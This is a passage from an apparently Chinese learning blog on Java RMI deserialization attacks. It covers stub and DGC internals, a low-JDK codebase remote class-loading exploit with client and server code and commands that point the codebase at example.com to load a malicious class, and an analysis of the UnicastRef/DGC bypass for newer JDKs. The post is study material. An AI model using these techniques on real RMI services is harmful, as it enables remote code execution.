title="向服务端做远程调用"></a>向服务端做远程调用</h4><p>我们从 <code>remoteObj.sayHello</code> 开始调试<br>发现我们调试第一步就直接进入了 <code>invoke</code></p><p><img src="https://bu.dusays.com/2024/05/24/664ff19d32beb.png" alt="image-20240524094707111"></p><p>因为这里 remoteObj 是一个动态代理，所以调用方法的时候就会直接进入 invoke。</p><p><img src="https://bu.dusays.com/2024/05/24/664ff1ac810ad.png" alt="image-20240524094722420"></p><p>我们从 invokeRemoteMethod 进入<br>然后跟进 invoke：</p><p><img src="https://bu.dusays.com/2024/05/24/664ff1bbaf127.png" alt="image-20240524094737588"></p><p>之后的走到 marshalValue 函数，这个函数就是判断是否是基本类型，不是的话就序列化</p><p><img src="https://bu.dusays.com/2024/05/24/664ff1d092865.png" alt="image-20240524094758471"></p><p><img src="https://bu.dusays.com/2024/05/24/664ff1e1525dc.png" alt="image-20240524094814823"></p><p>再往下，发现执行了 <code>call.executeCall()</code></p><p><img src="https://bu.dusays.com/2024/05/24/664ff1f2c58d1.png" alt="image-20240524094832683"></p><p>其实不管是用户自定义的 stub 还是系统定义的 stub 都会调用这个方法，**<code>executeCall()</code> 是处理网络请求的东西东西，这里也有可能被攻击。**</p><p>再往下走，如果调用的远程函数有返回值的话会执行 <code>unmarshalValue</code>，并且获取远程返回值是利用反序列化读出来的</p><p><img src="https://bu.dusays.com/2024/05/24/664ff202d4632.png" alt="image-20240524094848439"></p><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>客户端请求服务端的时候，有两个反序列化的点：<code>executeCall()</code> 和最后读取返回值。</p><p><code>executeCall()</code> 处理走的是 JRMP 协议，所以<strong>通过 JRMP 进行攻击</strong>就是通过 RMI 自定义的客户端协议进行攻击，攻击的是 stub。</p><p><strong>可以是客户端攻击服务端，也可以是服务端攻击客户端。</strong></p><h3 id="注册中心回应客户端"><a href="#注册中心回应客户端" class="headerlink" title="注册中心回应客户端"></a>注册中心回应客户端</h3><p>我们之前有说客户端在 <code>IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;remoteObj&quot;);</code> 的时候，需要把 <code>remoteObj</code> 序列化发给注册中心。然后注册中心再反序列化。</p><p><img src="https://bu.dusays.com/2024/05/24/664ff212db602.png" alt="image-20240524094904589"></p><p>我们再传入 <code>remoteObj</code> 的时候是 <code>lookup</code>，所以这里也是通过 <code>switch</code> 找到 <code>lookup</code>，这里<strong>其实只要有 <code>readObject</code> 的都可能会被反序列化攻击</strong></p><h3 id="服务端回应客户端"><a href="#服务端回应客户端" class="headerlink" title="服务端回应客户端"></a>服务端回应客户端</h3><p>我们之前有说客户端在 <code>System.out.println(remoteObj.sayHello(&quot;hello&quot;));</code> 的时候，需要把 <code>hello</code> 序列化发给服务端。然后服务端再反序列化。</p><p><img src="https://bu.dusays.com/2024/05/24/664ff221bc4c7.png" alt="image-20240524094919374"></p><h3 id="DGC"><a href="#DGC" class="headerlink" title="DGC"></a>DGC</h3><p>DGC 会在创建远程服务的时候就自动创建 DGC 服务，我们来关注 DGC 服务是在何时、何处产生的。</p><p>我们定位到：<code>putTarget()</code>, 这个函数就是在众多七七八八的都创建完之后执行的，把一些东西放在静态表里面，我们可以注意到在 <code>putTarget()</code> 中，有一个 <code>DGCImpl.dgcLog.isLoggable</code></p><p><img src="https://bu.dusays.com/2024/05/24/664ff23cdb412.png" alt="image-20240524094946598"></p><p>DGC 服务就是在这里创建的，这里是调用了 DGCImpl 类的静态函数，在类的动态加载中我们提到只要调用了类的静态函数就对这个类进行了初始化，因此会执行类的 <code>static</code> 静态代码块</p><p><img src="https://bu.dusays.com/2024/05/24/664ff24bba4da.png" alt="image-20240524095001306"></p><p>在 DGCImpl 的静态代码块里面的 try 里执行了 <code>new DGCImpl()</code>, 再往下看一下 stub 是怎么创建的，其实原理和我们之前分析服务端的 skel 和客户端的 stub 一样，看一下 JDK 是否有 <code>DGCImpl_Stub</code> 这个类，有则反射创建。</p><p>在 <code>DGCImpl_Stub</code> 类中有两个方法，<code>clean</code> 和 <code>dirty</code>。这两个函数都有我们之前说过比较危险的地方：**<code>readObject</code> 和 <code>invoke</code>**</p><p><img src="https://bu.dusays.com/2024/05/24/664ff25c2a7e3.png" alt="image-20240524095017821"></p><p><img src="https://bu.dusays.com/2024/05/24/664ff26ad3c0f.png" alt="image-20240524095032373"></p><p>因此存在被攻击的风险。<br><code>DGCImpl_Skel</code> 也是同理，也存在危险的地方</p><p><img src="https://bu.dusays.com/2024/05/24/664ff27a76f4e.png" alt="image-20240524095048037"></p><h2 id="RMI-攻击利用"><a href="#RMI-攻击利用" class="headerlink" title="RMI 攻击利用"></a>RMI 攻击利用</h2><h3 id="低版本jdk"><a href="#低版本jdk" class="headerlink" title="低版本jdk"></a>低版本jdk</h3><p>上面我们审计的是8u65的版本 实际上相对很老 </p><p>攻击面也如上 哪儿哪儿都可以进行攻击</p><p>具体怎么攻击我还没有找到相应的学习资料 等学完反序列化这部分应该对怎么利用更清楚一点 好像是会用到cc链来</p><p>这里我讲讲一个更低版本的利用：</p><h4 id="简单利用"><a href="#简单利用" class="headerlink" title="简单利用"></a>简单利用</h4><p>先阐述一些简单的利用吧 但这个利用没有什么价值：</p><p>首先，RMI Registry是一个远程对象管理的地方，可以理解为一个远程对象的“后台”。我们可以尝试直</p><p>接访问“后台”功能，比如修改远程服务器上Hello对应的对象：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">RemoteHelloWorld</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line">Naming.rebind(<span class="string">&quot;rmi://192.168.135.142:1099/Hello&quot;</span>, h);</span><br></pre></td></tr></table></figure><p>却爆出了这样的错误：</p><p><img src="https://bu.dusays.com/2024/05/23/664f022a0ee66.png" alt="image-20240520161350985"></p><p>原来Java对远程访问RMI Registry做了限制，只有来源地址是localhost的时候，才能调用rebind、bind、unbind等方法。</p><p>不过list和lookup方法可以远程调用。</p><p>list方法可以列出目标上所有绑定的对象：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] s = Naming.list(<span class="string">&quot;rmi://192.168.135.142:1099&quot;</span>);</span><br></pre></td></tr></table></figure><p>lookup作用就是获得某个远程对象。</p><p>那么，只要目标服务器上存在一些危险方法，我们通过RMI就可以对其进行调用，之前曾经有一个<a href="https://github.com/NickstaDB/BaRMIe">工具</a>，其中一个功能就是进行危险方法的探测。</p><p>怎么说呢 这个利用嗯。。。</p><h4 id="更低版本的利用"><a href="#更低版本的利用" class="headerlink" title="更低版本的利用"></a>更低版本的利用</h4><p>曾经有段时间，Java是可以运行在浏览器中的，对，就是Applet这个奇葩。在使用Applet的时候通常需要指定一个codebase属性，比如：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;applet code=<span class="string">&quot;HelloWorld.class&quot;</span> codebase=<span class="string">&quot;Applets&quot;</span> width=<span class="string">&quot;800&quot;</span> height=<span class="string">&quot;600&quot;</span>&gt;</span><br><span class="line">&lt;/applet&gt;</span><br></pre></td></tr></table></figure><p>除了Applet，RMI中也存在远程加载的场景，也会涉及到codebase。</p><p><code>codebase</code>是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的<code>CLASSPATH</code>，但<code>CLASSPATH</code>是本地路径，而<code>codebase</code>通常是远程URL，比如http、ftp等。</p><p>如果我们指定 <code>codebase=http://example.com/</code> ，然后加载 <code>org.vulhub.example.Example</code> 类，则Java虚拟机会下载这个文件 <code>http://example.com/org/vulhub/example/Example.class </code>，并作为Example类的字节码。</p><p>RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的<code>CLASSPATH</code>下寻找想对应的类；如果在本地没有找到这个类，就会去远程加载<code>codebase</code>中的类。</p><p>这个时候问题就来了，如果codebase被控制，我们不就可以加载恶意类了吗？</p><p>对，在RMI中，我们是可以将<code>codebase</code>随着序列化数据一起传输的，服务器在接收到这个数据后就会去<code>CLASSPATH</code>和指定的<code>codebase</code>寻找类，由于<code>codebase</code>被控制导致任意命令执行漏洞。</p><p>不过显然官方也注意到了这一个安全隐患，所以只有满足如下条件的RMI服务器才能被攻击：</p><ul><li><p>安装并配置了<code>SecurityManager</code></p></li><li><p>Java版本<strong>低于7u21、6u45</strong>，或者设置了 <code>java.rmi.server.useCodebaseOnly=false</code></p></li></ul><p>其中 java.rmi.server.useCodebaseOnly 是在Java 7u21、6u45的时候修改的一个默认设置：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html</span><br><span class="line"></span><br><span class="line">https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</span><br></pre></td></tr></table></figure><p>官方将 <code>java.rmi.server.useCodebaseOnly</code> 的默认值由 false 改为了 true 。在</p><p>java.rmi.server.useCodebaseOnly 配置为 true 的情况下，Java虚拟机将只信任预先配置好的</p><p>codebase ，不再支持从RMI请求中获取。</p><p>我们来编写一个简单的RMIServer用于复现这个漏洞。建立4个文件：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ICalc.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ICalc</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Calc.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">ICalc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calc</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (Integer param : params) &#123;</span><br><span class="line">        sum += param;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RemoteRMIServer.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;setup SecurityManager&quot;</span>);</span><br><span class="line">            System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">SecurityManager</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Calc</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calc</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;refObj&quot;</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RemoteRMIServer</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// client.policy</span></span><br><span class="line">grant &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>同样 这里我也是n合一了</p><p>编译运行：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javac *.java</span><br><span class="line">java -Djava.rmi.server.hostname=<span class="number">192.168</span><span class="number">.135</span><span class="number">.142</span> - Djava.rmi.server.useCodebaseOnly=<span class="literal">false</span> -Djava.security.policy=client.policy</span><br><span class="line">RemoteRMIServer</span><br></pre></td></tr></table></figure><p>其中， <code>java.rmi.server.hostname</code> 是服务器的IP地址，远程调用时需要根据这个值来访问RMI-Server。</p><p>然后，我们再建立一个RMIClient.java：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Payload</span> <span class="keyword">extends</span> <span class="title class_">ArrayList</span>&lt;Integer&gt; &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ICalc</span> <span class="variable">r</span> <span class="operator">=</span> (ICalc)</span><br><span class="line">            Naming.lookup(<span class="string">&quot;rmi://192.168.135.142:1099/refObj&quot;</span>);</span><br><span class="line">        List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">Payload</span>();</span><br><span class="line">        li.add(<span class="number">3</span>);</span><br><span class="line">        li.add(<span class="number">4</span>);</span><br><span class="line">        System.out.println(r.sum(li));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIClient</span>().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个Client我们需要在另一个位置运行，因为我们需要让RMI Server在本地CLASSPATH里找不到类，才会去加载codebase中的类，所以不能将RMIClient.java放在RMI Server所在的目录中。</p><p>运行RMIClient：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.useCodebaseOnly=<span class="literal">false</span> -</span><br><span class="line">Djava.rmi.server.codebase=http:<span class="comment">//example.com/ RMIClient</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/23/664f022b5d90e.png" alt="image-20240520162730395"></p><p>查看example.com的日志，可见收到了来自Java的请求 &#x2F;RMIClient$Payload.class 。因为我们还没有实际放置这个类文件，所以上面出现了异常：</p><p><img src="https://bu.dusays.com/2024/05/23/664f021ce18c3.png" alt="image-20240520162813421"></p><p>我们只需要编译一个恶意类，将其class文件放置在Web服务器的 &#x2F;RMIClient$Payload.class 即可</p><p>这种利用条间比较苛刻</p><h3 id="高版本jdk绕过利用"><a href="#高版本jdk绕过利用" class="headerlink" title="高版本jdk绕过利用"></a>高版本jdk绕过利用</h3><p>前面低版本jdk主要利用在<strong>注册中心和DGC</strong></p><p>高版本(8u121以上)当然重点对这两个包里的类进行了处理：</p><p><strong>Registylmp.java：</strong></p><p>具体怎么实现的这里简单说下</p><p><img src="https://bu.dusays.com/2024/05/23/664f02225600f.png" alt="image-20240520163547140"></p><p>这里加了一个函数</p><p><img src="https://bu.dusays.com/2024/05/23/664f022b117ef.png" alt="image-20240520163437984"></p><p>这里多加了一个判断：</p><p>这个输入流如果是这几个类 才能反序列化</p><p><strong>DGClmp.java:</strong></p><p>更上面这个差不多 甚至更严重一些：</p><p><img src="https://bu.dusays.com/2024/05/23/664f021b25346.png" alt="image-20240520163819166"></p><p>这里有一个checkInput函数</p><p>同样也有if:</p><p><img src="https://bu.dusays.com/2024/05/23/664f022671685.png" alt="image-20240520163932821"></p><p>也是只有这几个类才能反序列化</p><p><strong>远程对象直接反序列化</strong></p><p>之前不是还用远程对象之间反序列化吗</p><p>在高版本下：</p><p>这个流程太复杂了 没分析明白 </p><p>是必须知道具体参数类型才行(String object这种)</p><p>限制很大 </p><p>因为：</p><p>远程对象直接反序列化： 限制态度 难以利用</p><p>DGC: DGC的几个类都是些没有什么功能的类 难以利用</p><p>故：</p><p>我们只能从注册中心下手（这也是为什么一般都打注册中心的原因）</p><p><img src="https://bu.dusays.com/2024/05/23/664f021fbaf65.png" alt="image-20240520164609148"></p><p>看来看去其实也就两个类可以利用：</p><ul><li>java.lang.reflect.Proxy.class</li><li>UnicastRef.class</li></ul><p>其他都没什么用</p><h4 id="UnicastRef-class"><a href="#UnicastRef-class" class="headerlink" title="UnicastRef.class"></a>UnicastRef.class</h4><p>先说下这个吧 前面我们审过</p><p>这个也是最常用的</p><p>我们前面分析的时候提到过：</p><p>有一个invoke方法</p><p>也就是那个**jrmp的一个攻击 ** 所有rmi客户端都会收到攻击</p><p>但是他的高版本<strong>只修复服务端的攻击 对客户端的攻击并没有修复</strong></p><p><img src="https://bu.dusays.com/2024/05/23/664f021d18cd1.png" alt="image-20240520165549449"></p><p>所以接下来我们的思路就是想办法让<strong>服务端来发起一个客户端请求</strong> 这样就会在服务端引起一个反序列化的攻击</p><p>invoke是怎么被调用的呢</p><p>不就是那几个stub吗</p><ul><li>RegistyImpl_Stub</li><li>DGCImpl_Stub</li></ul><p>还有一个动态代理 但这个只有在生成创建服务端时才会调用</p><p>怎么创建Stub呢</p><p>是通过一个函数：<code>createProxy</code></p><p>那这个函数在哪里可以调用呢：</p><p>注册中心：</p><ul><li>LocateRegistry-&gt;getRegistry中调用</li><li>ActivatableRef-&gt;getStub中调用</li><li>UnicastSeverRef-&gt;exportObject中导出时调用</li></ul><p><strong>注册中心的都没什么用 调用不了</strong></p><p>DGC:</p><ul><li><p>DGCImpl静态代码块中调用（没办法干涉）</p></li><li><p>DGCClient.EndpointEntry-&gt;EndpointEntry</p><p><img src="https://bu.dusays.com/2024/05/23/664f02269df1e.png" alt="image-20240520171348038"></p></li></ul><p>这个才是我们能调用的</p><p>在构造函数创建了一个DGC服务</p><p>我们无法在一个已经跑起来的程序中来改变代码逻辑 只能是通过反序列化的方式来实现</p><p><img src="https://bu.dusays.com/2024/05/23/664f021eed7cc.png" alt="image-20240520171928009"></p><p>所以：</p><p>以这里做为入口</p><p>1.想办法创建一个EndpointEntry类 并生成一个DGC</p><p>2.让DGC来发起一个客户端请求</p><p>先来第一步：</p><p>从EndpointEntry往上找 直到找到一个反序列化的点</p><p>find usages</p><p><img src="https://bu.dusays.com/2024/05/23/664f022753ab4.png" alt="image-20240520172252101"></p><p><img src="https://bu.dusays.com/2024/05/23/664f02237a6e4.png" alt="image-20240520172311945"></p><p>找到一个lookup  没用</p><p><img src="https://bu.dusays.com/2024/05/23/664f022717b27.png" alt="image-20240520172335196"></p><p>再往上找</p><p>是一个do - while  没用</p><p><img src="https://bu.dusays.com/2024/05/23/664f0223b8ad3.png" alt="image-20240520172523613"></p><p>再往上找</p><p>找到两个地方</p><p><img src="https://bu.dusays.com/2024/05/23/664f0224b99eb.png" alt="image-20240520172606829"></p><p>有一个是ConnectionInputStream：</p><p><img src="https://bu.dusays.com/2024/05/23/664f02274acca.png" alt="image-20240520172637021"></p><p>另一个点是LiveRef:</p><p>一个else里面</p><p><img src="https://bu.dusays.com/2024/05/23/664f0227099fa.png" alt="image-20240520172856629"></p><p>如果这个输入流不是ConnectionInputStream才会调用</p><p>但是整个输入流都是ConnectionInputStream 所以根本调用不了</p><p>所以要从ConnectionInputStream往上找</p><p>找到在StreamRemoteCall-&gt;releaseStream里面</p><p><img src="https://bu.dusays.com/2024/05/23/664f021f1ca47.png" alt="image-20240520173805571"></p><p>StreamRemoteCall不觉得熟悉？</p><p>这不是jrmp的那个攻击点吗</p><p>而releaseStream会创建一个DGC服务</p><p>releaseStream在哪儿调的呢</p><p>是在RegistryImpl_Skel里面</p><p><img src="https://bu.dusays.com/2024/05/23/664f02292867d.png" alt="image-20240520174216954"></p><p>到这里流程就通了</p><p>Skel不是在服务端吗</p><p>那不就是说明我们在服务端找到一个点 能让他创建一个DGC服务</p><p>那下一步我们让这个DGC服务发起一个请求就行</p><p>注意在registryRefs中有一个if 这是阻挡我们的地方</p><p><img src="https://bu.dusays.com/2024/05/23/664f022a0cd70.png" alt="image-20240520174750204"></p><p>当他是空的时候就会调用</p><p>所以接下来我们再动态调试找怎么才能让他不是空</p><p>最后发现：<br><img src="https://bu.dusays.com/2024/05/23/664f0220bfa17.png" alt="image-20240520175106431"></p><p>incommingRefTable中的savaRef方法</p><p>再调试：</p><p>找到刚刚的read方法</p><p><img src="https://bu.dusays.com/2024/05/23/664f0221da108.png" alt="image-20240520175239971"></p><p>read函数又是再哪儿调的呢：</p><p><img src="https://bu.dusays.com/2024/05/23/664f02251c222.png" alt="image-20240520175400558"></p><p><strong>readExternal</strong></p><p>这个有点像原生类 也就是说在反序列化的时候有这个类也会调用</p><p>由此：</p><p>1.我们先序列化一个UnicastRef对象</p><p>2.在里面保存一个ref</p><p><img src="https://bu.dusays.com/2024/05/23/664f0223b7a85.png" alt="image-20240520175856620"></p><p>在UnicastRef的反序列化流程里面他会调用readExternal</p><p><img src="https://bu.dusays.com/2024/05/23/664f0222dff5f.png" alt="image-20240520180003366"></p><p>然后就是saveRef</p><p><img src="https://bu.dusays.com/2024/05/23/664f02271e6af.png" alt="image-20240520180056890"></p><p>然后就会把incommingRefTable赋值 这样就不为空了</p><p>此时内存里面的那个表就已经有值了</p><p>接下来就正常走反序列化流程</p><p>到releaseInputStream</p><p><img src="https://bu.dusays.com/2024/05/23/664f021ed9f9a.png" alt="image-20240520180540799"></p><p>接着就会往下走</p><p><img src="https://bu.dusays.com/2024/05/23/664f0220a4061.png" alt="image-20240520180609270"></p><p>这个表就不为空了</p><p>这样我们的攻击就会在正常的反序列化中进行</p><p>到这里：</p><p><img src="https://bu.dusays.com/2024/05/23/664f0228de286.png" alt="image-20240520180731618"></p><p>但这里我们只做了赋值还没有进行请求</p><p>注意后面的NewThreadAction</p><p>这是在调自己里面的线程</p><p>这个线程是什么呢</p><p><img src="https://bu.dusays.com/2024/05/23/664f0225b43fc.png" alt="image-20240520181039580"></p><p>它其实最后是调了一个makeDirtyCall</p><p><img src="https://bu.dusays.com/2024/05/23/664f021d9bbeb.png" alt="image-20240520181134615"></p><p>它其实就是调了DGC</p><p><img src="https://bu.dusays.com/2024/05/23/664f0227bd343.png" alt="image-20240520181214323"></p><h4 id="java-lang-reflect-Proxy-class"><a href="#java-lang-reflect-Proxy-class" class="headerlink" title="java.lang.reflect.Proxy.class"></a>java.lang.reflect.Proxy.class</h4><p>这个很少在用</p><p>还记得我前面用的那个低于7u21、6u45的利用吗</p><p>那个是用codebase来加载远程类，在RMI服务端执行任意代码</p><p>这里我们从原理上阐述一下</p><p>我们用wireshark来抓一下那个包</p><p>当然也有2个TCP连接</p><ol><li><p>本机与RMI Registry的通信（在我的数据包中是1099端口）</p></li><li><p>本机与RMI Server的通信（在我的数据包中是64000端口）</p></li></ol><p>我们用 <code>tcp.stream eq 0</code> 来筛选出本机与RMI Registry的数据流：</p><p><img src="https://bu.dusays.com/2024/05/23/664f021e91841.png" alt="image-20240520201839538"></p><p>可见，在与RMI Registry通信的时候Wireshark识别出了协议类型。我们选择其中序号是8的数据包，然</p><p>后复制Wireshark识别出的 Java Serialization 数据段：</p><p><img src="https://bu.dusays.com/2024/05/23/664f022a33464.png" alt="image-20240520201940308"></p><p>这段数据由0xACED开头，这是一段java序列化数据</p><p>我们可以使用SerializationDumper对Java序列化数据进行分析：</p><p><img src="https://bu.dusays.com/2024/05/23/664f021f2e910.png" alt="image-20240520202044280"></p><p>SerializationDumper输出了很多预定义常量，像 TC_BLOCKDATA 这种，它究竟表示什么意思呢？此时</p><p>我们还得借助Java序列化的协议<a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html">文档</a></p><p>这篇文档里用了一种类似BNF（巴科斯范式）的形式描述了序列化数据的语法，比如我们这里的这段简单的数据，其涉及到如下语法规则：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stream:</span><br><span class="line"> magic version contents</span><br><span class="line"></span><br><span class="line">contents:</span><br><span class="line"> content</span><br><span class="line"> contents content</span><br><span class="line"></span><br><span class="line">content:</span><br><span class="line"> object</span><br><span class="line"> blockdata</span><br><span class="line"></span><br><span class="line">object:</span><br><span class="line"> newObject</span><br><span class="line"> newClass</span><br><span class="line"> newArray</span><br><span class="line"> newString</span><br><span class="line"> newEnum</span><br><span class="line"> newClassDesc</span><br><span class="line"> prevObject</span><br><span class="line"> nullReference</span><br><span class="line"> exception</span><br><span class="line"> TC_RESET</span><br><span class="line"></span><br><span class="line">blockdata:</span><br><span class="line"> blockdatashort</span><br><span class="line"> blockdatalong</span><br><span class="line"></span><br><span class="line">blockdatashort:</span><br><span class="line"> TC_BLOCKDATA (unsigned byte)&lt;size&gt; (byte)[size]</span><br><span class="line"></span><br><span class="line">newString:</span><br><span class="line"> TC_STRING newHandle (utf)</span><br><span class="line"> TC_LONGSTRING newHandle (long-utf)</span><br></pre></td></tr></table></figure><p>其中 TC_BLOCKDATA 这部分对应的是 contents -&gt; content -&gt; blockdata -&gt; blockdatashort ，TC_STRING 这部分对应的是 contents -&gt; content -&gt; object-&gt; newString 。都可以在文档里找到完整的语法定义。</p><p>这一整个序列化对象，其实描述的就是一个字符串，其值是 refObj 。意思是获取远程的 refObj 对象。</p><p>接着我们在序号为10的数据包中获取到了这个对象：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">STREAM_MAGIC - 0xac ed</span><br><span class="line">STREAM_VERSION - 0x00 05</span><br><span class="line">Contents</span><br><span class="line">TC_BLOCKDATA - 0x77</span><br><span class="line">Length - 15 - 0x0f</span><br><span class="line">Contents - 0x01a4462ec50000016d8d8d63578008</span><br><span class="line">TC_OBJECT - 0x73</span><br><span class="line">TC_PROXYCLASSDESC - 0x7d</span><br><span class="line">newHandle 0x00 7e 00 00</span><br><span class="line">Interface count - 2 - 0x00 00 00 02</span><br><span class="line">proxyInterfaceNames</span><br><span class="line">0:</span><br><span class="line">Length - 15 - 0x00 0f</span><br><span class="line">Value - java.rmi.Remote - 0x6a6176612e726d692e52656d6f7465</span><br><span class="line">1:</span><br><span class="line">Length - 5 - 0x00 05</span><br><span class="line">Value - ICalc - 0x4943616c63</span><br><span class="line">classAnnotations</span><br><span class="line">TC_NULL - 0x70</span><br><span class="line">TC_ENDBLOCKDATA - 0x78</span><br><span class="line">superClassDesc</span><br><span class="line">TC_CLASSDESC - 0x72</span><br><span class="line">className</span><br><span class="line">Length - 23 - 0x00 17</span><br><span class="line">Value - java.lang.reflect.Proxy -</span><br><span class="line">0x6a6176612e6c616e672e7265666c6563742e50726f7879</span><br><span class="line">serialVersionUID - 0xe1 27 da 20 cc 10 43 cb</span><br><span class="line">newHandle 0x00 7e 00 01</span><br><span class="line">classDescFlags - 0x02 - SC_SERIALIZABLE</span><br><span class="line">fieldCount - 1 - 0x00 01</span><br><span class="line">Fields</span><br><span class="line">0:</span><br><span class="line">Object - L - 0x4c</span><br><span class="line">fieldName</span><br><span class="line">Length - 1 - 0x00 01</span><br><span class="line">Value - h - 0x68</span><br><span class="line">className1</span><br><span class="line">TC_STRING - 0x74</span><br><span class="line">newHandle 0x00 7e 00 02</span><br><span class="line">Length - 37 - 0x00 25</span><br><span class="line">Value - Ljava/lang/reflect/InvocationHandler; -</span><br><span class="line">0x4c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723</span><br><span class="line">b</span><br><span class="line">classAnnotations</span><br><span class="line">TC_NULL - 0x70</span><br><span class="line">TC_ENDBLOCKDATA - 0x78</span><br><span class="line">superClassDesc</span><br><span class="line">TC_NULL - 0x70</span><br><span class="line">newHandle 0x00 7e 00 03</span><br><span class="line">classdata</span><br><span class="line">java.lang.reflect.Proxy</span><br><span class="line">values</span><br><span class="line">h</span><br><span class="line">(object)</span><br><span class="line">TC_OBJECT - 0x73</span><br><span class="line">TC_CLASSDESC - 0x72</span><br><span class="line">className</span><br><span class="line">Length - 45 - 0x00 2d</span><br><span class="line">Value - java.rmi.server.RemoteObjectInvocationHandler -</span><br><span class="line">0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696</span><br><span class="line">f6e48616e646c6572</span><br><span class="line">serialVersionUID - 0x00 00 00 00 00 00 00 02</span><br><span class="line">newHandle 0x00 7e 00 